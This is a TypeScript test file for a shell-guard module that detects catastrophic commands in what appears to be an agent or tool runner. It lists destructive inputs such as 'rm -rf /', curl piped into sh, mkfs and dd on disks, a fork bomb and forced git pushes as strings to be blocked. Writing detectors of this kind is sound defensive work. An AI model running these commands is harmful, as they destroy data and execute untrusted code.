import { describe, expect, it } from "vitest";

import { CatastrophicCommandError, catastrophicShellReason } from "../src/internal/shell-guard.js";

const RM = "rm -rf of a root/home/glob path";

describe("catastrophicShellReason — rm -rf of root/home/glob", () => {
  it("blocks 'rm -rf /', 'rm -rf ~', 'rm -fr /*'", () => {
    expect(catastrophicShellReason("rm -rf /")).toBe(RM);
    expect(catastrophicShellReason("rm -rf ~")).toBe(RM);
    expect(catastrophicShellReason("rm -fr /*")).toBe(RM);
  });

  it("blocks root-target variants 'rm -rf //', 'rm -rf \"/\"', 'rm -rf / ' (EC-2)", () => {
    expect(catastrophicShellReason("rm -rf //")).toBe(RM);
    expect(catastrophicShellReason('rm -rf "/"')).toBe(RM);
    expect(catastrophicShellReason("rm -rf / ")).toBe(RM);
  });

  it("blocks $HOME and brace-form env-root targets", () => {
    expect(catastrophicShellReason("rm -rf $HOME")).toBe(RM);
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell var is the test input
    expect(catastrophicShellReason("rm -rf ${HOME}")).toBe(RM);
  });

  it("blocks top-level system dirs '/etc', '/usr', '/home', '/var', '/boot'", () => {
    expect(catastrophicShellReason("rm -rf /etc")).toBe(RM);
    expect(catastrophicShellReason("rm -rf /usr")).toBe(RM);
    expect(catastrophicShellReason("rm -rf /home/")).toBe(RM);
    expect(catastrophicShellReason("rm -rf /var")).toBe(RM);
    expect(catastrophicShellReason("rm -rf /boot")).toBe(RM);
  });

  it("blocks 'rm -rf /' hidden after chain connectors '&&', ';', '||' (EC-1)", () => {
    expect(catastrophicShellReason("ls && rm -rf /")).toBe(RM);
    expect(catastrophicShellReason("ls; rm -rf /")).toBe(RM);
    expect(catastrophicShellReason("ls || rm -rf /")).toBe(RM);
  });

  it("blocks 'sudo rm -rf /' (sudo prefix, EC-1)", () => {
    expect(catastrophicShellReason("sudo rm -rf /")).toBe(RM);
  });

  it("blocks long-form flags 'rm --recursive --force /' and split '-r -f'", () => {
    expect(catastrophicShellReason("rm --recursive --force /")).toBe(RM);
    expect(catastrophicShellReason("rm -r -f /")).toBe(RM);
  });

  it("allows safe relative 'rm -rf ./build' / 'rm -rf node_modules' / specific subdir (D2)", () => {
    expect(catastrophicShellReason("rm -rf ./build")).toBeNull();
    expect(catastrophicShellReason("rm -rf node_modules")).toBeNull();
    expect(catastrophicShellReason("rm -rf /home/user/project/dist")).toBeNull();
  });
});

describe("catastrophicShellReason — pipe into a shell", () => {
  it("blocks 'curl http://x | sh', 'wget -O- u | bash', 'curl u | sudo bash'", () => {
    expect(catastrophicShellReason("curl http://x | sh")).toBe("curl/wget piped into a shell");
    expect(catastrophicShellReason("wget -O- u | bash")).toBe("curl/wget piped into a shell");
    expect(catastrophicShellReason("curl u | sudo bash")).toBe("curl/wget piped into a shell");
  });

  it("does not over-block a benign pipe 'echo hello | grep h' / 'git status | cat'", () => {
    expect(catastrophicShellReason("echo hello | grep h")).toBeNull();
    expect(catastrophicShellReason("git status | cat")).toBeNull();
  });
});

describe("catastrophicShellReason — device / filesystem destruction", () => {
  it("blocks 'mkfs.ext4 /dev/sda' and bare 'mkfs /dev/sda'", () => {
    expect(catastrophicShellReason("mkfs.ext4 /dev/sda")).toBe("mkfs on a device");
    expect(catastrophicShellReason("mkfs /dev/sda")).toBe("mkfs on a device");
  });

  it("blocks 'dd if=/dev/zero of=/dev/sda' and operand-first 'dd of=/dev/nvme0n1'", () => {
    expect(catastrophicShellReason("dd if=/dev/zero of=/dev/sda")).toBe("dd writing to a device");
    expect(catastrophicShellReason("dd of=/dev/nvme0n1")).toBe("dd writing to a device");
  });

  it("blocks redirects to a block device 'echo x > /dev/sda', '> /dev/nvme0n1'", () => {
    expect(catastrophicShellReason("echo x > /dev/sda")).toBe("redirect to a device");
    expect(catastrophicShellReason("cat z > /dev/nvme0n1")).toBe("redirect to a device");
  });

  it("does not block redirect to a benign device '> /dev/null'", () => {
    expect(catastrophicShellReason("echo x > /dev/null")).toBeNull();
  });
});

describe("catastrophicShellReason — fork bomb", () => {
  it("blocks ':(){ :|:& };:' despite internal pipe/semicolon (EC-1)", () => {
    expect(catastrophicShellReason(":(){ :|:& };:")).toBe("fork bomb");
  });

  it("does not over-block a legit shell function 'f(){ echo a | grep b & }'", () => {
    expect(catastrophicShellReason("f(){ echo a | grep b & }")).toBeNull();
  });
});

describe("catastrophicShellReason — git force push", () => {
  it("blocks 'git push --force' and 'git push -f origin main'", () => {
    expect(catastrophicShellReason("git push --force")).toBe("git push --force");
    expect(catastrophicShellReason("git push -f origin main")).toBe("git push --force");
  });

  it("blocks the '+refspec' force form 'git push origin +main'", () => {
    expect(catastrophicShellReason("git push origin +main")).toBe("git push --force");
  });

  it("allows 'git push --force-with-lease'", () => {
    expect(catastrophicShellReason("git push --force-with-lease")).toBeNull();
  });
});

describe("catastrophicShellReason — recursive chmod/chown on root", () => {
  it("blocks 'chmod -R 777 /'", () => {
    expect(catastrophicShellReason("chmod -R 777 /")).toBe("chmod -R on a root path");
  });

  it("blocks 'chown -R user /'", () => {
    expect(catastrophicShellReason("chown -R user /")).toBe("chown -R on a root path");
  });
});

describe("catastrophicShellReason — safe commands and mentions", () => {
  it("allows 'ls -la', 'echo hi', 'git status', 'cat f'", () => {
    expect(catastrophicShellReason("ls -la")).toBeNull();
    expect(catastrophicShellReason("echo hi")).toBeNull();
    expect(catastrophicShellReason("git status")).toBeNull();
    expect(catastrophicShellReason("cat f")).toBeNull();
  });

  it("does not over-block a mention 'echo \"rm -rf /\"' (command-position, EC-4)", () => {
    expect(catastrophicShellReason('echo "rm -rf /"')).toBeNull();
  });

  it("returns null for empty / whitespace / comment-only input (EC-3)", () => {
    expect(catastrophicShellReason("")).toBeNull();
    expect(catastrophicShellReason("   ")).toBeNull();
    expect(catastrophicShellReason("# just a comment")).toBeNull();
  });
});

describe("CatastrophicCommandError", () => {
  it("extends ConfigurationError shape with code 'catastrophic_command'", () => {
    const err = new CatastrophicCommandError("rm -rf of a root path");
    expect(err).toBeInstanceOf(Error);
    expect(err.name).toBe("CatastrophicCommandError");
    expect((err as { code?: string }).code).toBe("catastrophic_command");
    expect(err.message).toContain("rm -rf of a root path");
  });
});
